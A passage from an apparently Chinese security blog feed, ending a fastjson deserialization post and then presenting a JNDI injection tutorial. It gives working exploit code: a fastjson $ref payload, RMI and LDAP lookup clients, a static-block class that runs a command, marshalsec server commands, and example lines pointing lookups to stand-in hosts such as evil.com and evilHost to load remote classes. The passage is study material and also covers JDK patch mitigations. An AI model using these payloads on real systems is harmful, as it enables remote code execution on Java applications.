alt="image-20240801222607739"></p><p>实际上面的getConnection不满足fastjson对自动调用getter的要求，前面说过：</p><blockquote><p>满足条件的getter：</p><ul><li>函数名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger</li></ul></blockquote><p>在<code>&#123;&quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;……&#125;</code> 这一整段外面再套一层<code>&#123;&#125;</code>，这样的话会把这个整体当做一个JSONObject，会把这个当做key，值为bbb</p><p>将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法（因为key一定要是String类型）</p><p>而且JSONObject是Map的子类，当调用<code>toString</code>的时候，会依次调用该类的getter方法获取值。所以会调用到<code>getConnection</code>方法。</p><p><img src="/2024/08/01/fastjson/image-20240801222706621.png" alt="image-20240801222706621"></p><p>当fastjson&gt;&#x3D;1.2.36的时候，可以使用<code>$ref</code>方式调用getter。</p><p>ref是fastjson特有的JSONPath语法，用来引用之前出现的对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">private</span> String cmd;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCmd</span><span class="hljs-params">(String cmd)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;seter call&quot;</span>);<br>        <span class="hljs-built_in">this</span>.cmd = cmd;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCmd</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;geter call&quot;</span>);<br>        Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ref_fastjson.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ref_fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[&#123;\&quot;@type\&quot;:\&quot;com.demo.fastjson.test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="原生反序列化"><a href="#原生反序列化" class="headerlink" title="原生反序列化"></a>原生反序列化</h3><p>来自Y4佬：</p><p><a href="https://paper.seebug.org/2055/">FastJson 与原生反序列化 (seebug.org)</a></p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">FastJson与原生反序列化(二) (y4tacker.github.io)</a></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>七七八八抄了一些，打比赛的时候遇到fastjson也挺多的，多学习学习。但fastjson也逐渐淡出视野了。</p><p>现在java8的题将要死去，出现更多的java11、java17，这都是新的挑战，因为涉及到全新的思路与方法。</p><p>现在我只不过是沿着前人的道路一步步筑基罢了。</p><p>Jackson跟fastjson很像，放在后面写。</p><p>以及最后附上su18大佬的，常看常新：</p><p><a href="https://su18.org/post/fastjson/#%E4%B8%80-%E7%AE%80%E4%BB%8B">fastjson：我一路向北，离开有你的季节 | 素十八 (su18.org)</a></p><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson">FastJson 🪁 | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI</title>
    <link href="/2024/07/30/JNDI/"/>
    <url>/2024/07/30/JNDI/</url>
    
    <content type="html"><![CDATA[<p>JNDI它终于来了。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先介绍一下什么是JNDI。</p><p>JNDI(<code>Java Naming and Directory Interface</code>)：Java命名与目录接口</p><p>标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口（SPI）的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使Java应用程序能和这些命名服务和目录服务之间进行交互。</p><p>目录服务是命名服务的一种自然扩展。</p><p><strong>Naming Service 命名服务：</strong> 把一个服务名称和对象或命名引用相关联。在一些命名服务系统中并不直接将对象进行存储，而是存储了对象的引用，引用包含了如何访问实际对象的信息，类似于指针。</p><ul><li><strong>Bindings</strong>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 DNS 中域名绑定到对应的 IP。</li><li><strong>Context</strong>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (<code>subcontext</code>)。</li><li><strong>References</strong>: 当存在上述的特殊情况时，以引用的形式进行存储，可以理解为指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd ，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li></ul><p><strong>Directory Service 目录服务：</strong> 在命名基础上增加了属性（文件目录中每个文件和目录都有属性：如创建时间、读写执行权限）不仅可以根据名称去查找(<strong>lookup</strong>)对象(并获取其对应属性)，还可以根据属性值去搜索(<strong>search</strong>)对象。</p><p>应用通过JNDI与具体的目录服务进行交互。从设计上，JNDI 独立于具体的目录服务实现，设计出了应用范围宽泛的(也就是兼容性比较强大)，因此可以针对不同的目录服务提供统一的操作接口。</p><p><img src="/2024/07/30/JNDI/image-20240730190919769.png" alt="image-20240730190919769"></p><p>SPI 全称为 Service Provider Interface，即服务供应接口，主要作用是<strong>为底层的具体的目录服务提供统一接口</strong>，从而实现目录服务的可插拔式安装。在 JDK 中包含了下述内置的目录服务:</p><ul><li>RMI：Remote Method Invocation 远程方法调用</li><li>LDAP：Lightweight Directory Access Protocol 轻量级目录访问协议</li><li>CORBA：Common Object Request Broker Architecture 通用对象请求代理架构</li></ul><p>在 Java JDK 里面提供了5个包，提供给JNDI的功能实现，分别是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">·javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。<br><br>·javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；<br><br>·javax.naming.event：在命名目录服务器中请求事件通知；<br><br>·javax.naming.ldap：提供LDAP支持；<br><br>·javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。<br></code></pre></td></tr></table></figure><h2 id="共有类Common-Class"><a href="#共有类Common-Class" class="headerlink" title="共有类Common Class"></a>共有类Common Class</h2><h3 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类:"></a><code>InitialContext</code>类:</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">InitialContext() 构建一个初始上下文。 <br><br>InitialContext(<span class="hljs-type">boolean</span> lazy) 构造一个初始上下文，并选择不初始化它。 <br><br>InitialContext(Hashtable environment) 使用提供的环境构建初始上下文。<br></code></pre></td></tr></table></figure><p>构建初始上下文，就是获取初始目录环境。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">bind(Name name, Object obj) 将名称绑定到对象。 <br>list(String name) 枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。 <br>lookup(String name) 检索命名对象。 <br>rebind(String name, Object obj) 将名称绑定到对象，覆盖任何现有绑定。 <br>unbind(String name) 取消绑定命名对象。<br></code></pre></td></tr></table></figure><h3 id="References类："><a href="#References类：" class="headerlink" title="References类："></a><code>References</code>类：</h3><p>在命名&#x2F;目录系统外部找到的对象的引用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference(String className)<br>为类名为“className”的对象构造一个新的引用。<br><br>Reference(String className, RefAddr addr)<br>为类名为“className”的对象和地址构造一个新引用。<br><br>Reference(String className, RefAddr addr, String factory, String factoryLocation)<br>为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。<br><br>Reference(String className, String factory, String factoryLocation)<br>为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。<br><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> posn, RefAddr addr)</span> 将地址添加到索引posn的地址列表中。<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(RefAddr addr)</span> 将地址添加到地址列表的末尾。<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> 从此引用中删除所有地址。<br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> 检索索引posn上的地址。<br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(String addrType)</span> 检索地址类型为“addrType”的第一个地址。<br>Enumeration <span class="hljs-title function_">getAll</span><span class="hljs-params">()</span> 检索本参考文献中地址的列举。<br>String <span class="hljs-title function_">getClassName</span><span class="hljs-params">()</span> 检索引用引用的对象的类名。<br>String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> 检索此引用引用的对象的工厂位置。<br>String <span class="hljs-title function_">getFactoryClassName</span><span class="hljs-params">()</span> 检索此引用引用对象的工厂的类名。<br>Object <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> 从地址列表中删除索引posn上的地址。<br><span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> 检索此引用中的地址数。<br>String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> 生成此引用的字符串表示形式。<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jndi</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>; <br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;aa&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看到<code>Reference</code>,并没有实现<code>Remote</code>接口也没有继承 <code>UnicastRemoteObject</code>类，前面讲RMI的时候说过，将类注册到<code>Registry</code>需要实现<code>Remote</code>和继承<code>UnicastRemoteObject</code>类。</p><p>这里并没有看到相关的代码，所以这里还需要调用<code>ReferenceWrapper</code>将他给封装一下。</p><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>LDAP(<code>Lightweight Directory Access Protocol</code>)：轻量目录访问协议</p><p>类似于数据库。</p><p>1.<br>   基于TCP&#x2F;IP协议<br>2. 分成服务端&#x2F;客户端：服务端存储数据，客户端与服务端连接进行操作<br>3. 相对于<code>mysql</code>的表型存储，不同的是<code>LDAP</code>使用<strong>树型存储</strong></p><ul><li><code>dn</code>：<code>domain name</code>用于唯一标识一个项，类似于MYSQL主键<ul><li><code>dc</code>: <code>domain compose</code></li><li><code>ou</code>：<code>organization unit</code></li><li><code>uid</code></li></ul></li></ul><p>LDAP协议主要用于单点登录SSO(Single Sign on)</p><h2 id="JNDI-Attack"><a href="#JNDI-Attack" class="headerlink" title="JNDI Attack"></a>JNDI Attack</h2><p>为了在命名服务或目录服务中绑定<code>Java</code>对象，可以使用<code>Java</code>序列化来传输对象，但有时候不太合适，比如<code>Java</code>对象较大的情况。</p><p>因此JNDI定义了命名引用(<code>Naming References</code>)，后面直接简称引用(<code>References</code>)。</p><p>这样对象就可以通过绑定一个可以被命名管理器(<code>Naming Manager</code>)解码(<code>decodeObject</code>)并解析为原始对象的引用，间接地存储在命名或目录服务中。</p><p>引用由<code>Reference</code>类来表示，它由地址(<code>RefAddress</code>)的有序列表和所引用对象的信息组成。而每个地址包含了如何构造对应的对象的信息，包括引用对象的<code>Java</code>类名，以及用于创建对象的<code>ObjectFactory</code>类的名称和位置。 </p><p><code>Reference</code>可以使用<code>ObjectFactory</code>来构造对象。当使用<code>lookup()</code>方法查找对象时，<code>Reference</code>将使用提供的<code>ObjectFactory</code>类的加载地址来加载<code>ObjectFactory</code>类，<code>ObjectFactory</code>类将构造出需要的对象。</p><p><strong>所谓的 <code>JNDI</code> 注入就是控制 <code>lookup</code> 函数的参数，这样来使客户端访问恶意的 <code>RMI</code> 或者 <code>LDAP</code> 服务来加载恶意的对象，从而执行代码，完成利用。</strong> </p><p>在 <code>JNDI</code> 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 <code>Reference</code> 类实现的。<code>Reference</code> 类表示对存在于命名&#x2F;目录系统以外的对象的引用。</p><p>具体则是指如果远程获取 <code>RMI</code> 服务器上的对象为 <code>Reference</code> 类或者其子类时，则可以从其他服务器上加载恶意 <code>class</code> 字节码文件来实例化 <code>Reference</code> 类常用属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">className 远程加载时所使用的类名 <br>classFactory 加载的 class 中需要实例化类的名称 <br>classFactoryLocation 提供 classes 数据的地址可以是 file/ftp/http 等协议<br></code></pre></td></tr></table></figure><p>如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;http://evilHost/&quot;</span> ); <br>registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br></code></pre></td></tr></table></figure><p>假如客户端使用RMI协议，lookup请求服务端bind的Exploit类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>ctx.lookup(<span class="hljs-string">&quot;rmi://evilHost/Exploit&quot;</span>);<br></code></pre></td></tr></table></figure><p>客户端在本地 <code>CLASSPATH</code> 查找 <code>Exploit</code> 类，如果没有则根据设定的 <code>Reference</code> 属性，</p><p>到<code>URL</code>： <code>http://evilHost/Exploit.class</code> 获取构造对象实例，构造方法中的恶意代码就会被执行。</p><h3 id="JNDI-References-注入"><a href="#JNDI-References-注入" class="headerlink" title="JNDI References 注入"></a>JNDI References 注入</h3><p>JNDI中对象的传递有两种：</p><ul><li>序列化</li><li>引用</li></ul><p><strong>对于引用，若客户端<code>lookup()</code>的内容可控，控制客户端去访问恶意的服务中心（<code>rmi、ldap</code>），获取恶意的引用，进而获取恶意远程服务器的恶意class文件进行执行。</strong></p><p><img src="/2024/07/30/JNDI/image-20240730204623748.png" alt="image-20240730204623748"></p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><ol><li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <strong>rmi:&#x2F;&#x2F;evil.com:1099&#x2F;refObj</strong></li><li>原先配置好的上下文环境 会因为动态环境转换而被指向 <strong>rmi:&#x2F;&#x2F;evil.com:1099&#x2F;</strong></li><li>应用去 <strong>rmi:&#x2F;&#x2F;evil.com:1099</strong> 请求绑定对象 refObj，攻击者事先准备好的 RMI 服务会返回与名称 refObj 绑定的ReferenceWrapper 对象</li><li>应用获取到 ReferenceWrapper 对象开始从本地 <strong>CLASSPATH</strong> 中搜索 EvilObject 类，如果不存在则会从恶意远程服务器上去尝试获取 <strong>EvilObject.class</strong>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code></li><li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <strong>EvilObject.class</strong></li><li>应用开始调用 <strong>EvilObject</strong> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行</li></ol><h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><ul><li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly 默认值被设置为 true。将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端JVM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li><li>JDK 6u132、7u122、8u113之后：增加了 com.sun.jndi.rmi.object.trustURLCodebase 选项，默认为 false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li><li>JDK 6u211、7u201、8u191之后：增加了 com.sun.jndi.ldap.object.trustURLCodebase 选项，默认为 false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li></ul><p><img src="/2024/07/30/JNDI/image-20240730204805160.png" alt="image-20240730204805160"></p><p>对于JNDI高版本绕过，当然也有方法，这里我再博客园也写过：</p><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943">绕过JDK高版本限制进行JNDI注入 - Eddie_Murphy - 博客园 (cnblogs.com)</a></p><p>详细的后面也会再写写。</p><h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI-RMI"></a>JNDI-RMI</h3><h4 id="attack-1"><a href="#attack-1" class="headerlink" title="attack"></a>attack</h4><p>写个最基础的方式：</p><p>RMIServer：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>RMIClient：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>calc.java编译为class文件，<code>python -m http.server 8080</code>起Web服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动服务端、客户端，触发客户端弹出计算器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">注：Server的url端口后面一定要有斜线（/）！！！<br><br>这里的恶意类calc.java实际上最好实现javax.naming.spi.ObjectFactory接口，并重写getObjectInstance方法，否则客户端请求得到字节码文件后，会抛出异常（可能就是因为calc.java没有实现ObjectFactory接口）<br></code></pre></td></tr></table></figure><h4 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h4><p>JDK 6u132、7u122、8u113之后：增加了 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 选项，默认为 false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞。</p><p>在<code>RegistryContext</code>中，会判断 <code>trustURLCodebase</code>，默认为false</p><p><img src="/2024/07/30/JNDI/image-20240730210709177.png" alt="image-20240730210709177"></p><h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI-LDAP"></a>JNDI-LDAP</h3><h4 id="attack-2"><a href="#attack-2" class="headerlink" title="attack"></a>attack</h4><p><code>LDAP</code>服务中<code>lookup</code>方法中指定的远程地址使用的是<code>LDAP</code>协议，由攻击者控制<code>LDAP</code>服务端返回一个恶意<code>jndi Reference</code>对象，并且<code>LDAP</code>服务的<code>Reference</code>远程加载<code>Factory</code>类并不是使用<code>RMI Class Loader</code>机制，因此不受<code>trustURLCodebase</code>限制。</p><p>ldap的实现代码较多，这里使用工具<code>marshalsec</code>来启动LDAP服务</p><h4 id="marshalsec下载及使用"><a href="#marshalsec下载及使用" class="headerlink" title="marshalsec下载及使用"></a>marshalsec下载及使用</h4><p>下载地址：<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p>maven打包为jar包：<code>mvn clean package -DskipTests</code></p><p>项目会多出一个target目录，进入可以看到生成的jar包</p><p>开启ldap服务：<code>java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#calc 8099</code></p><p>作用是将LDAP查询请求重定向到<code>http://127.0.0.1:8000/#calc</code>，calc为恶意代码编译得到的class文件</p><p><code>python -m http.server 8000</code>下放calc.class</p><p><strong>注意：calc.java不要包含包名，否则在远程调用的时候会因为类名不正确而报错</strong></p><p>客户端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:8099/aaa&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>查询ldap的地址为：<code>ldap://127.0.0.1:8099/aaa</code>，后面的aaa是随便写的用于DN查找的字符</p><p><img src="/2024/07/30/JNDI/image-20240730211225200.png" 